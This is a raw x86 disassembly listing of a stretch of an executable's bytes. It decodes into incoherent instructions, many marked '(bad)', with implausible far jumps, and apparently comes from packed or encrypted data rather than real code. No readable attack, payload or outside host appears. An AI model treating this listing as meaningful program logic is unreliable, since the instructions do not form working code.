  40d9bb:	stc    
  40d9bc:	and    eax,0x7878b83e
  40d9c1:	push   0x7c
  40d9c3:	js     0x40da3d
  40d9c5:	pop    es
  40d9c6:	add    DWORD PTR [edi-0x994cf14],ebp
  40d9cc:	(bad)  
  40d9cd:	push   cs
  40d9ce:	push   edi
  40d9cf:	push   edi
  40d9d0:	xchg   DWORD PTR [eax+0x49a50a62],eax
  40d9d6:	fidivr DWORD PTR [ebx-0x3f]
  40d9d9:	add    al,BYTE PTR [eax+0x77]
  40d9dc:	cmp    DWORD PTR [esi+0x1d],edx
  40d9df:	push   ds
  40d9e0:	jae    0x40d9ce
  40d9e2:	popa   
  40d9e3:	mov    DWORD PTR [ecx],ebp
  40d9e5:	arpl   WORD PTR [ecx+0x3e13e780],bx
  40d9eb:	sub    al,0xba
  40d9ed:	mov    ecx,es
  40d9ef:	fldcw  WORD PTR [ebp-0x67a07a94]
  40d9f5:	call   0x29714aeb
  40d9fa:	call   0xbf67:0x25d46a02
  40da01:	sub    DWORD PTR [ebx+0x1e],0xffffffe1
  40da05:	mov    BYTE PTR [eax],ah
  40da07:	adc    eax,0x763edab
  40da0c:	xor    eax,0x6557d376
  40da11:	test   BYTE PTR [ebx-0x4d],ch
  40da14:	adc    DWORD PTR [edx],ebx
  40da16:	and    al,0x55
  40da18:	stos   BYTE PTR es:[edi],al
  40da19:	ret    0x931b
  40da1c:	xchg   ecx,eax
  40da1d:	loop   0x40da92
  40da1f:	popa   
  40da20:	outs   dx,DWORD PTR ds:[esi]
  40da21:	or     bh,BYTE PTR [eax-0x5c515a45]
  40da27:	hlt    
  40da28:	fnstcw WORD PTR [ebx]
  40da2a:	xor    al,ah
  40da2c:	jnp    0x40da5b
  40da2e:	lds    edi,FWORD PTR [ebx+ebp*1]
  40da31:	dec    eax
  40da32:	test   bh,al
  40da34:	test   BYTE PTR [ecx-0x2bec87a5],bh
  40da3a:	es add esp,eax
  40da3d:	mov    al,0xb1
  40da3f:	sub    edi,edx
  40da41:	xchg   ebp,esi
  40da43:	xchg   edx,eax
  40da44:	sub    DWORD PTR [ebx],0x59287628
  40da4a:	xchg   DWORD PTR [ecx],ebx
  40da4c:	push   0x27e8d349
  40da51:	jno    0x40dac1
  40da53:	repz sub ebx,esp
  40da56:	push   esp
  40da57:	sub    eax,DWORD PTR [ecx+0x21]
  40da5a:	sbb    esi,ecx
  40da5c:	ror    ebx,cl
  40da5e:	repz push esp
  40da60:	push   DWORD PTR [edx+0x5d3c0db0]
  40da66:	jne    0x40dad7
  40da68:	scas   al,BYTE PTR es:[edi]
  40da69:	sbb    bh,BYTE PTR [edx-0x3b]
  40da6c:	jno    0x40daba
  40da6e:	in     ax,0xde
  40da71:	ret    0xd9b
  40da74:	inc    edx
  40da75:	pop    ebx
  40da76:	repz cdq 
  40da78:	imul   esp,ebx,0xc555d156
  40da7e:	das    
  40da7f:	into   
  40da80:	mov    DWORD PTR [ecx+ebp*4-0x2cc4ebde],ecx
  40da87:	adc    eax,0xd2dbe7d0
  40da8c:	in     al,0x62
  40da8e:	pop    esi
  40da8f:	fcmovne st,st(7)
  40da91:	call   0xd736c44f
  40da96:	cmp    DWORD PTR [ebx-0x4c],0xfffffffb
  40da9a:	(bad)  
  40da9c:	mov    eax,ds:0xac887a12
  40daa1:	and    dh,dl
  40daa3:	sub    al,0xdd
  40daa5:	enter  0x357a,0xc6
  40daa9:	repnz add bh,BYTE PTR ds:0x1e5b902f
  40dab0:	cdq    
  40dab1:	push   ds
  40dab2:	adc    DWORD PTR [esi+edx*8],eax
  40dab5:	mov    ecx,0xdb4b37e6
  40daba:	lea    edi,[ebx-0x6381e90d]
  40dac0:	jb     0x40db32
  40dac2:	pop    ebx
  40dac3:	and    esp,DWORD PTR ds:0x99c71605
  40dac9:	adc    al,0xcc
  40dacb:	jb     0x40da58
  40dacd:	jnp    0x40da6b
  40dacf:	xchg   ecx,eax
  40dad0:	dec    edx
  40dad1:	je     0x40da67
  40dad3:	out    dx,al
  40dad4:	mov    dh,0xd4
  40dad6:	adc    DWORD PTR [eax+0x31],0xb7cf058b
  40dadd:	sub    DWORD PTR [eax-0x60],ebx
  40dae0:	add    cl,BYTE PTR [ebp+0x26b521f1]
  40dae6:	shl    DWORD PTR [ebx+0x2c097d9b],0x1
  40daed:	cmp    DWORD PTR [esi+edx*8-0x3b],esi
  40daf1:	(bad)  
  40daf2:	mov    ebp,0xc1bb4f73
  40daf7:	(bad)  
  40daf8:	jo     0x40daa9
  40dafa:	push   edx
  40dafb:	das    
  40dafc:	push   ecx
  40dafd:	pop    esi
  40dafe:	cmp    dl,BYTE PTR [esi+ebx*8]
  40db01:	pushf  
  40db02:	shl    DWORD PTR [ecx-0x5a],0xea
  40db06:	cdq    
  40db07:	xlat   BYTE PTR ds:[ebx]
  40db08:	sub    dl,ah
  40db0a:	mov    dl,0xb4
  40db0c:	in     eax,dx
  40db0d:	fidivr WORD PTR ds:0xf5129990
  40db13:	add    BYTE PTR [esi+ecx*2],cl
  40db16:	loop   0x40dad7
  40db18:	aaa    
  40db19:	sti    
  40db1a:	sbb    eax,0x397d9e81
  40db1f:	pop    es
  40db20:	mov    eax,0xd457fbc0
  40db25:	fmul   DWORD PTR ds:0x4279ba78
  40db2b:	cmp    eax,DWORD PTR [edx-0x76842b79]
  40db31:	push   esp
  40db32:	dec    esp
  40db33:	ror    BYTE PTR [esi+0x6],cl
  40db36:	imul   ebx,DWORD PTR [ecx],0x2d
  40db39:	imul   ebp,esp,0x3499933c
  40db3f:	daa    
  40db40:	push   edx
  40db41:	jno    0x40dad4
  40db43:	fdiv   QWORD PTR [ecx+0x2e]
  40db46:	inc    esp
  40db47:	loopne 0x40dae4
  40db49:	(bad)  
  40db4a:	sub    al,0x59
  40db4c:	stos   BYTE PTR es:[edi],al
  40db4d:	cmp    DWORD PTR [ecx+0x2bb31caf],ecx
  40db53:	dec    esp
  40db54:	cmp    ebx,eax
  40db56:	aad    0xa8
  40db58:	outs   dx,DWORD PTR ds:[esi]
  40db59:	cmp    edx,0x0
  40db5c:	sar    BYTE PTR [ecx],0xcb
  40db5f:	dec    ebp
  40db60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db61:	add    ecx,DWORD PTR [eax]
  40db63:	aas    
  40db64:	mov    bl,0x10
  40db66:	push   edi
  40db67:	daa    
  40db68:	mov    al,ds:0x7fb314f
  40db6d:	div    BYTE PTR [eax+ebx*4]
  40db70:	cdq    
  40db71:	mov    ds:0xc92ebf0e,al
  40db76:	in     al,0x38
  40db78:	ror    esp,0x93
  40db7b:	lahf   
  40db7c:	in     eax,dx
  40db7d:	sbb    eax,0x873cb4c3
  40db82:	(bad)  [ecx]
  40db84:	loop   0x40db9d
  40db86:	test   al,0xea
  40db88:	dec    ebx
  40db89:	dec    ebp
  40db8a:	in     al,dx
  40db8b:	or     edx,edi
  40db8d:	xlat   BYTE PTR ds:[ebx]
  40db8e:	sbb    ebx,DWORD PTR [edx-0x4478fda9]
  40db94:	int    0x2a
  40db96:	fwait
  40db97:	mov    cl,0x9b
  40db99:	dec    esi
  40db9a:	shl    BYTE PTR [edx],cl
  40db9c:	in     al,dx
  40db9d:	push   ecx
  40db9e:	fucomip st,st(2)
  40dba0:	xor    eax,0xd645a369
  40dba5:	pop    ebp
  40dba6:	arpl   WORD PTR [ecx],dx
  40dba8:	sbb    ah,BYTE PTR [eax]
  40dbaa:	sbb    eax,0x8cd76f01
  40dbaf:	popf   
  40dbb0:	mov    dh,0x8
  40dbb2:	cmp    eax,0x6973642f
  40dbb7:	mov    bl,0x2
  40dbb9:	sbb    ebp,edi
  40dbbb:	lods   al,BYTE PTR ds:[esi]
  40dbbc:	outs   dx,DWORD PTR ds:[esi]
  40dbbd:	pop    ss
  40dbbe:	fstp   DWORD PTR [ebx+0x61]
  40dbc1:	outs   dx,BYTE PTR ds:[esi]
  40dbc2:	or     eax,0x35bde324
  40dbc7:	jns    0x40db8e
  40dbc9:	jns    0x40dc36
  40dbcb:	push   ds
  40dbcc:	sub    cl,BYTE PTR [esi-0x40]
  40dbcf:	enter  0xe552,0x96
  40dbd3:	lods   eax,DWORD PTR ds:[esi]
  40dbd4:	pusha  
  40dbd5:	(bad)  
  40dbd6:	and    al,0x5e
  40dbd8:	mov    bh,0xae
  40dbda:	inc    ecx
  40dbdb:	jle    0x40dbcd
  40dbdd:	mov    ecx,0x137e21cd
  40dbe2:	clc    
  40dbe3:	bound  edi,QWORD PTR [edi]
  40dbe5:	pop    edx
  40dbe6:	mov    ebp,0x8f32f0d5
  40dbeb:	cmp    DWORD PTR [ebx],0x3f95d5f9
  40dbf1:	sti    
  40dbf2:	dec    ecx
  40dbf3:	out    dx,eax
  40dbf4:	xchg   edi,eax
  40dbf5:	loopne 0x40dc43
  40dbf7:	pop    ss
  40dbf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbf9:	adc    eax,0x2f41a72f
  40dbfe:	lahf   
  40dbff:	push   ds
  40dc00:	adc    DWORD PTR [eax+0x67958910],edi
  40dc06:	cmp    eax,0x6b10475f
  40dc0b:	dec    edx
  40dc0c:	arpl   WORD PTR ss:[edi+0x2d085364],sp
  40dc13:	ins    BYTE PTR es:[edi],dx
  40dc14:	jno    0x40dbd9
  40dc16:	pop    ebp
  40dc17:	mov    ah,0x58
  40dc19:	jns    0x40dbab
  40dc1b:	aad    0x26
  40dc1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc1e:	dec    ebp
  40dc1f:	dec    edx
  40dc20:	or     esi,edi
  40dc22:	fbld   TBYTE PTR [edi]
  40dc24:	sbb    al,0xc
  40dc26:	icebp  
  40dc27:	lods   al,BYTE PTR ds:[esi]
  40dc28:	xchg   ebx,eax
  40dc29:	scas   eax,DWORD PTR es:[edi]
  40dc2a:	adc    ebp,ebx
  40dc2c:	ret    0xdd5c
  40dc2f:	sbb    DWORD PTR [edi],esi
  40dc31:	mov    esi,0xd894cecb
  40dc36:	iret   
  40dc37:	call   0x23412b9e
  40dc3c:	bound  ebx,QWORD PTR [ecx-0x69db6344]
  40dc42:	(bad)  [esi]
  40dc44:	mov    ebp,0x7802e753
  40dc49:	jg     0x40dc02
  40dc4b:	push   esp
  40dc4c:	or     al,0xa7
  40dc4e:	mov    bl,0xfd
  40dc50:	pop    esp
  40dc51:	fwait
  40dc52:	mov    ds:0x4eb69c84,al
  40dc57:	loope  0x40dc6e
  40dc59:	pop    ebx
  40dc5a:	jge    0x40dbe8
  40dc5c:	mov    eax,ds:0x3dff3bc5
  40dc61:	ss sbb edx,0xe
  40dc65:	adc    ch,cl
  40dc67:	cmp    eax,0xb777905f
  40dc6c:	sti    
  40dc6d:	mov    bh,0xa3
  40dc6f:	cmp    dl,BYTE PTR [edx+0x4f9dbaff]
  40dc75:	shl    BYTE PTR [eax*4+0x5f67e251],cl
  40dc7c:	retf   
  40dc7d:	in     al,dx
  40dc7e:	imul   ebx,DWORD PTR [edx+ecx*4+0x22316f24],0xbd7766a6
  40dc89:	push   es
  40dc8a:	rcl    BYTE PTR [ebp-0xa71fe52],cl
  40dc90:	sbb    edi,esp
  40dc92:	out    dx,eax
  40dc93:	das    
  40dc94:	(bad)  [eax-0x6e]
  40dc97:	push   edi
  40dc98:	dec    eax
  40dc99:	adc    BYTE PTR [ebp+0xb],bl
  40dc9c:	push   0x6774a60c
  40dca1:	dec    edi
  40dca2:	(bad)  
  40dca3:	iret   
  40dca4:	sub    al,0xbf
  40dca6:	mov    ch,0xd7
  40dca8:	cmp    ebx,DWORD PTR [ebp+0x69e553c5]
  40dcae:	xor    DWORD PTR [eax-0x40],eax
  40dcb1:	aad    0x7f
  40dcb3:	std    
  40dcb4:	ins    DWORD PTR es:[edi],dx
  40dcb5:	xor    esp,ecx
  40dcb7:	aad    0xe9
  40dcb9:	test   al,0x30
  40dcbb:	push   ebp
  40dcbc:	xchg   ecx,eax
  40dcbd:	and    eax,0x7656b52f
  40dcc2:	mov    edi,es
  40dcc4:	cmp    dh,ah
  40dcc6:	inc    edx
  40dcc7:	jmp    0x139c:0x88514223
  40dcce:	jmp    0x40dd17
  40dcd0:	sahf   
  40dcd1:	repz and al,0x29
  40dcd4:	xchg   edi,eax
  40dcd5:	arpl   WORD PTR [ecx+0x47d09141],sp
  40dcdb:	outs   dx,BYTE PTR ds:[esi]
  40dcdc:	sbb    eax,0x22e12de2
  40dce1:	add    edi,DWORD PTR [ecx-0x3b88f3b7]
  40dce7:	sub    DWORD PTR [ecx],edi
  40dce9:	fwait
  40dcea:	inc    ecx
  40dceb:	les    ebx,FWORD PTR [ebx]
  40dced:	jp     0x40dd6e
  40dcef:	gs repnz xchg esp,eax
  40dcf2:	adc    al,0xf
  40dcf4:	stc    
  40dcf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcf6:	pushf  
  40dcf7:	xchg   esp,eax
  40dcf8:	xchg   ebx,eax
  40dcf9:	pop    edx
  40dcfa:	inc    ebx
  40dcfb:	ds ins DWORD PTR es:[edi],dx
  40dcfd:	sti    
  40dcfe:	mov    dh,0xb
  40dd00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd01:	inc    edx
  40dd02:	inc    edi
  40dd03:	bound  ebp,QWORD PTR [edi+0xa]
  40dd06:	iret   
  40dd07:	sahf   
  40dd08:	bound  ebp,QWORD PTR [eax-0x4]
  40dd0b:	pushf  
  40dd0c:	aad    0x6b
  40dd0e:	xchg   ebx,eax
  40dd0f:	lods   al,BYTE PTR ds:[esi]
  40dd10:	sub    al,0xef
  40dd12:	add    BYTE PTR [ebp-0x6c88e480],ch
  40dd18:	test   al,0x4d
  40dd1a:	gs mov dl,0x10
  40dd1d:	nop
  40dd1e:	ret    0x1fe3
  40dd21:	jl     0x40dcde
  40dd23:	push   eax
  40dd24:	mov    ebp,0x61d680ae
  40dd29:	daa    
  40dd2a:	test   BYTE PTR [ebx-0x3381bdbb],ah
  40dd30:	push   ebp
  40dd31:	jno    0x40dcc8
  40dd33:	mov    ch,0xd3
  40dd35:	xor    al,0xf9
  40dd37:	push   cs
  40dd38:	push   0x71
  40dd3a:	add    al,al
  40dd3c:	xor    eax,0x1cb0fd66
  40dd41:	xor    bh,bh
  40dd43:	jge    0x40dd1d
  40dd45:	pop    ds
  40dd46:	inc    edx
  40dd47:	mov    edi,0x75954664
  40dd4c:	loopne 0x40ddb0
  40dd4e:	pop    ecx
  40dd4f:	mov    ds:0xed1fc8ec,al
  40dd54:	cmp    ebx,ecx
  40dd56:	inc    edi
  40dd57:	mov    ebp,fs
  40dd59:	hlt    
  40dd5a:	jo     0x40dd3b
  40dd5c:	out    dx,al
  40dd5d:	das    
  40dd5e:	push   eax
  40dd5f:	sub    al,0x39
  40dd61:	jmp    0x40dd97
  40dd63:	loopne 0x40dcef
  40dd65:	dec    eax
  40dd66:	xor    ah,ch
  40dd68:	das    
  40dd69:	pop    es
  40dd6a:	fisttp QWORD PTR [edi]
  40dd6c:	icebp  
  40dd6d:	shl    DWORD PTR [edx],1
  40dd6f:	ja     0x40dd10
  40dd71:	in     al,dx
  40dd72:	retf   0x97d8
  40dd75:	or     ecx,edi
  40dd77:	lods   eax,DWORD PTR ds:[esi]
  40dd78:	cmp    BYTE PTR [ebp+0x445a00c7],ah
  40dd7e:	aam    0x7a
  40dd80:	mov    bl,0xa3
  40dd82:	mov    al,ds:0x45c8fea0
  40dd87:	into   
  40dd88:	loopne 0x40ddfc
  40dd8a:	fdivr  DWORD PTR [esi-0x6d75bdf1]
  40dd90:	push   esp
  40dd91:	adc    DWORD PTR [ebx+0x38e60b62],ebp
  40dd97:	push   esi
  40dd98:	jp     0x40dd94
  40dd9a:	jnp    0x40ddee
  40dd9c:	cmc    
  40dd9d:	push   esp
  40dd9e:	cld    
  40dd9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dda0:	scas   al,BYTE PTR es:[edi]
  40dda1:	pop    ebp
  40dda2:	int    0xe
  40dda4:	fwait
  40dda5:	loopne 0x40ddd2
  40dda7:	xchg   edx,eax
  40dda8:	test   DWORD PTR [edx-0x78874235],0xb72c216e
  40ddb2:	pop    ss
  40ddb3:	jne    0x40dd72
  40ddb5:	sar    BYTE PTR [edi],1
  40ddb7:	retf   
  40ddb8:	fndisi(8087 only) 
  40ddba:	sbb    BYTE PTR [edi+0x3d],cl
  40ddbd:	cmp    BYTE PTR [edx+0x4],dl
  40ddc0:	daa    
  40ddc1:	pop    DWORD PTR ss:[ecx+0x74]
  40ddc5:	aad    0xc1
  40ddc7:	mov    ecx,0x6026b4d5
  40ddcc:	mov    DWORD PTR [edx-0x6efb4a1c],ecx
  40ddd2:	add    al,al
  40ddd4:	cmp    eax,0xb36538b0
  40ddd9:	add    edi,DWORD PTR [edx+ebx*2-0x3c2e6c20]
  40dde0:	(bad)  
  40dde2:	ds push esp
  40dde4:	es inc ebx
  40dde6:	mov    ecx,0xcf27f758
  40ddeb:	ret    0x2b0f
  40ddee:	pop    esi
  40ddef:	fisttp DWORD PTR [edi]
  40ddf1:	add    BYTE PTR [ebp*1-0x7218c783],bh
  40ddf8:	or     edi,edi
  40ddfa:	stos   BYTE PTR es:[edi],al
  40ddfb:	pop    edx
  40ddfc:	aam    0xd7
  40ddfe:	cmp    ch,BYTE PTR [ebx-0xb8e7ae7]
  40de04:	pop    ss
  40de05:	and    DWORD PTR [ebp+ecx*2+0x7825a2d3],ebp
  40de0c:	adc    eax,0x31474460
  40de11:	add    ecx,DWORD PTR [ebp+0x19]
  40de14:	xor    edx,ebp
  40de16:	stos   BYTE PTR es:[edi],al
  40de17:	je     0x40de8c
  40de19:	cld    
  40de1a:	loopne 0x40de7f
  40de1c:	in     al,0xc8
  40de1e:	push   eax
  40de1f:	jne    0x40de3f
  40de21:	adc    ebp,0xffffffe2
  40de24:	pop    ss
  40de25:	cwde   
  40de26:	call   0xca20:0xbe25653b
  40de2d:	loopne 0x40ddd5
  40de2f:	jnp    0x40de36
  40de31:	aad    0x32
  40de33:	inc    DWORD PTR [edi-0x58ea0b84]
  40de39:	xor    eax,0xb7069ba
  40de3e:	sti    
  40de3f:	mov    al,ds:0x2221eefe
  40de44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de45:	xchg   ebp,eax
  40de46:	jl     0x40de08
  40de48:	loop   0x40de56
  40de4a:	je     0x40deab
  40de4c:	je     0x40dde4
  40de4e:	fdivr  QWORD PTR [ecx-0x45]
  40de51:	push   edx
  40de52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de53:	les    esi,FWORD PTR [ebp-0x6965ae4]
  40de59:	or     cl,bh
  40de5b:	add    DWORD PTR [ebp-0x61],edx
  40de5e:	mov    cl,bh
  40de60:	ficom  WORD PTR [ebx*4-0x5d2f6e2]
  40de67:	inc    edx
  40de68:	scas   al,BYTE PTR es:[edi]
  40de69:	pop    edx
  40de6a:	jle    0x40de30
  40de6c:	jmp    0x235b:0x3687c58d
  40de73:	mov    al,0x75
  40de75:	jge    0x40de02
  40de77:	push   ss
  40de78:	mov    ebp,0xe59b7007
  40de7d:	mov    eax,ds:0xa0621a7d
  40de82:	pop    esi
  40de83:	outs   dx,BYTE PTR ds:[esi]
  40de84:	outs   dx,BYTE PTR ds:[esi]
  40de85:	jmp    0x5542:0x3c11ce38
  40de8c:	out    dx,eax
  40de8d:	aam    0xea
  40de8f:	mov    cs,WORD PTR [esi]
  40de91:	push   esi
  40de92:	rcr    DWORD PTR [esi-0x6913e65c],cl
  40de98:	xchg   ebp,eax
  40de99:	daa    
  40de9a:	sub    ch,cl
  40de9c:	scas   al,BYTE PTR es:[edi]
  40de9d:	add    ax,0x9692
  40dea1:	aam    0xad
  40dea3:	add    al,0xd2
  40dea5:	fidivr WORD PTR [esi+eax*8]
  40dea8:	dec    eax
  40dea9:	xor    dh,BYTE PTR [ebp+0x17ad0803]
  40deaf:	pop    esp
  40deb0:	mov    cs,WORD PTR [edx]
  40deb2:	dec    ebx
  40deb3:	add    eax,edi
  40deb5:	test   eax,eax
  40deb7:	je     0x40fd27
  40debd:	jmp    0x40e3c8
  40dec2:	(bad)  
  40dec3:	ror    dl,cl
  40dec5:	rcr    dl,1
  40dec7:	rcr    dl,1
  40dec9:	rol    BYTE PTR [esi-0x60],cl
  40decc:	enter  0x333a,0xc2
  40ded0:	fisttp DWORD PTR [ebx+0x78784328]
  40ded6:	push   0x7c
  40ded8:	js     0x40df52
  40deda:	int3   
  40dedb:	fisttp WORD PTR [edi]
  40dedd:	push   esi
  40dede:	enter  0x81ae,0x9c
  40dee2:	(bad)  [ecx+0x7c]
  40dee5:	adc    ecx,ebx
  40dee7:	add    DWORD PTR [eax],0x56
  40deea:	ins    DWORD PTR es:[edi],dx
  40deeb:	xchg   ebx,ebp
  40deed:	or     edx,DWORD PTR [edx]
  40deef:	jle    0x40deeb
  40def1:	pop    edi
  40def2:	adc    eax,0x779779b5
  40def7:	push   ebx
  40def8:	fistp  WORD PTR [esi-0x6f]
  40defb:	push   esp
  40defc:	jmp    0x1044:0xe78f436c
  40df03:	sbb    edi,ebp
  40df05:	pop    esi
  40df06:	jmp    0x791b:0xe171da33
  40df0d:	cmp    eax,0x4a0e75ce
  40df12:	fs cmp al,0xa4
  40df15:	fidivr WORD PTR [esi]
  40df17:	loope  0x40df5a
  40df19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df1a:	and    DWORD PTR [eax-0xe],0x23bf2ce6
  40df21:	je     0x40df66
  40df23:	push   ebp
  40df24:	mov    dh,dl
  40df26:	jb     0x40df30
  40df28:	gs je  0x40df47
  40df2b:	ja     0x40def3
  40df2d:	lds    esi,FWORD PTR [edi]
  40df2f:	and    DWORD PTR [ebp+0x15],ecx
  40df32:	push   ecx
  40df33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df34:	push   es
  40df35:	pushw  ds
  40df37:	inc    esi
  40df38:	js     0x40dee1
  40df3a:	inc    ecx
  40df3b:	xor    eax,edi
  40df3d:	mov    ds:0x46a1e4db,eax
  40df42:	adc    al,0xbb
  40df44:	push   0xffffffb0
  40df46:	daa    
  40df47:	scas   al,BYTE PTR es:[edi]
  40df48:	popf   
  40df49:	in     eax,0x34
  40df4b:	pop    ss
  40df4c:	adc    BYTE PTR [ecx*1-0x60ae403a],cl
  40df53:	ret    
  40df54:	fs pushf 
  40df56:	xlat   BYTE PTR ds:[ebx]
  40df57:	enter  0x84e8,0xf
  40df5b:	in     eax,0x86
  40df5d:	into   
  40df5e:	push   edx
  40df5f:	inc    esp
  40df60:	and    al,0x85
  40df62:	inc    esi
  40df63:	cmp    al,0x7
  40df65:	clc    
  40df66:	mov    ecx,0x87e9c362
  40df6b:	call   0xd541:0xedda282e
  40df72:	outs   dx,BYTE PTR ds:[esi]
  40df73:	jne    0x40df82
  40df75:	nop
  40df76:	push   ss
  40df77:	imul   ebp,DWORD PTR [esi+0x46],0xddaf5429
  40df7e:	aam    0x57
  40df80:	fsubr  DWORD PTR [eax+0x653ec8d]
  40df86:	ret    0x5b6e
  40df89:	mov    eax,0x52dcf489
  40df8e:	adc    DWORD PTR ds:0xd09568c7,ecx
  40df94:	dec    ebp
  40df95:	gs jle 0x40dfdc
  40df98:	sbb    ah,BYTE PTR [edx+esi*4-0x6eb450bf]
  40df9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfa0:	in     eax,dx
  40dfa1:	loop   0x40dfa4
  40dfa3:	call   0xe018f02c
  40dfa8:	push   edi
  40dfa9:	push   ecx
  40dfaa:	sub    al,0x8f
  40dfac:	dec    edi
  40dfad:	inc    esp
  40dfae:	pop    esi
  40dfaf:	iret   
  40dfb0:	add    ah,BYTE PTR [ebx+0x147b6b5a]
  40dfb6:	(bad)  
  40dfb7:	aam    0x78
  40dfb9:	loope  0x40dfd1
  40dfbb:	mov    eax,0xf781062
  40dfc0:	adc    al,0xa1
  40dfc2:	jo     0x40df65
  40dfc4:	scas   al,BYTE PTR es:[edi]
  40dfc5:	add    bl,BYTE PTR [edi+0x7441fd50]
  40dfcb:	mov    ?,WORD PTR [ebx-0x46bc9c04]
  40dfd1:	mov    ecx,0x5b6de798
  40dfd6:	push   0xc27ab910
  40dfdb:	test   ch,bh
  40dfdd:	add    bh,BYTE PTR [esi+0x3e]
  40dfe0:	(bad)
  40dfe4:	out    0x7,al
  40dfe6:	mov    dl,0x8a
  40dfe8:	and    DWORD PTR [ebp-0x32],0x47a9b8f
  40dfef:	loop   0x40e066
  40dff1:	pop    ebx
  40dff2:	mov    edx,0x28233809
  40dff7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dff8:	mov    bl,0x10
  40dffa:	outs   dx,BYTE PTR ds:[esi]
  40dffb:	xor    eax,0x9a0b8f25
  40e000:	inc    esp
  40e001:	jae    0x40e033
  40e003:	ins    DWORD PTR es:[edi],dx
  40e004:	or     ch,BYTE PTR [edi-0x54]
  40e007:	xor    al,0xf4
  40e009:	clc    
  40e00a:	jge    0x40e089
  40e00c:	ficomp DWORD PTR [esi+0x17]
  40e00f:	ret    0x560b
  40e012:	arpl   di,di
  40e014:	popa   
  40e015:	and    BYTE PTR [ebx+0x46a2a412],0x8f
  40e01c:	shr    DWORD PTR [edi+0x1d1a153d],0x10
  40e023:	xchg   esi,eax
  40e024:	ds ret 
  40e026:	mov    eax,0x88eb2a84
  40e02b:	add    eax,0xd41828e9
  40e030:	inc    ebp
  40e031:	xor    BYTE PTR [edx+ecx*2-0x2f7be6ee],cl
  40e038:	adc    BYTE PTR [edx+ebx*8],dl
  40e03b:	daa    
  40e03c:	sbb    bh,bh
  40e03e:	mov    al,ds:0x456052bc
  40e043:	outs   dx,BYTE PTR ds:[esi]
  40e044:	sbb    esi,DWORD PTR [ebp-0x5b851e98]
  40e04a:	mov    edx,DWORD PTR [edx+0x749c1eb1]
  40e050:	in     eax,dx
  40e051:	jg     0x40e01e
  40e053:	sbb    al,0x48
  40e055:	add    BYTE PTR [si+0x5f],ah
  40e059:	xor    bh,dl
  40e05b:	aas    
  40e05c:	jno    0x40e065
  40e05e:	xor    eax,0xf4b89fbf
  40e063:	repnz mov bh,0xdc
  40e066:	mov    ds:0xe417984b,al
  40e06b:	out    dx,al
  40e06c:	xor    BYTE PTR [esi+0x66],0x6d
  40e070:	dec    ebx
  40e071:	test   al,0x98
  40e073:	cmp    DWORD PTR [esp+ebp*8],eax
  40e076:	push   esp
  40e077:	mov    edx,0xf6dd5d0d
  40e07c:	dec    edi
  40e07d:	rcl    DWORD PTR [eax+0x16],0x36
  40e081:	push   ecx
  40e082:	jo     0x40e0f9
  40e084:	and    ecx,ecx
  40e086:	cmp    al,0xad
  40e088:	inc    edx
  40e089:	push   eax
  40e08a:	cmc    
  40e08b:	adc    dh,bh
  40e08d:	push   ecx
  40e08e:	sub    eax,0xc00ee34a
  40e093:	mov    BYTE PTR [ebp*1-0x127c5c5],bh
  40e09a:	(bad)  
  40e09b:	hlt    
  40e09c:	sbb    al,0xf0
  40e09e:	xchg   ebx,eax
  40e09f:	mov    edx,ebx
  40e0a1:	fcom   DWORD PTR [ebp+0x4c687900]
  40e0a7:	and    BYTE PTR [eax-0x11b18048],ah
  40e0ad:	enter  0x3868,0xc6
  40e0b1:	fcom   QWORD PTR [esi]
  40e0b3:	adc    DWORD PTR [ecx+eiz*4-0x33360e5e],ebx
  40e0ba:	popa   
  40e0bb:	stc    
  40e0bc:	popa   
  40e0bd:	xor    DWORD PTR [ecx-0x17],esi
  40e0c0:	sub    DWORD PTR [ebp-0x1c],edi
  40e0c3:	dec    ebx
  40e0c4:	jae    0x40e07f
  40e0c6:	jmp    0x18b9:0xf286aa57
  40e0cd:	cmc    
  40e0ce:	test   eax,0x6e75af89
  40e0d3:	or     BYTE PTR [edi+edi*4+0x5d],0x9e
  40e0d8:	fst    DWORD PTR [ebp+0x7b5baddb]
  40e0de:	mov    esi,0xf66e20ce
  40e0e3:	cmc    
  40e0e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0e5:	and    bh,BYTE PTR [esi-0x17a9cdc3]
  40e0eb:	push   eax
  40e0ec:	test   al,0x6c
  40e0ee:	out    dx,al
  40e0ef:	add    dh,BYTE PTR [eax+0x37]
  40e0f2:	bsr    ebp,eax
  40e0f5:	das    
  40e0f6:	or     bl,BYTE PTR [edx-0x6e2bd147]
  40e0fc:	xchg   esp,eax
  40e0fd:	fcmove st,st(5)
  40e0ff:	pushf  
  40e100:	mov    eax,0x3898a355
  40e105:	jecxz  0x40e17d
  40e107:	dec    ebp
  40e108:	mov    bh,0x3a
  40e10a:	and    cl,bh
  40e10c:	mov    ch,0x35
  40e10e:	inc    eax
  40e10f:	xchg   ebp,eax
  40e110:	and    BYTE PTR [ebx-0x35],dl
  40e113:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e114:	and    edx,edi
  40e116:	leave  
  40e117:	or     DWORD PTR [edx-0x219b0018],eax
  40e11d:	repnz into 
  40e11f:	xchg   edx,eax
  40e120:	and    al,BYTE PTR [esi]
  40e122:	dec    esp
  40e123:	out    dx,al
  40e124:	pop    ds
  40e125:	mov    dh,0xf3
  40e127:	sbb    BYTE PTR [eax],ah
  40e129:	xchg   ebp,eax
  40e12a:	das    
  40e12b:	cmc    
  40e12c:	jb     0x40e148
  40e12e:	call   0x1ed6420
  40e133:	jnp    0x40e1b2
  40e135:	push   cs
  40e136:	icebp  
  40e137:	adc    BYTE PTR [eax+eiz*8+0x74],0x24
  40e13c:	out    0xca,al
  40e13e:	(bad)  [esi]
  40e140:	pop    edx
  40e141:	or     eax,ebp
  40e143:	push   ecx
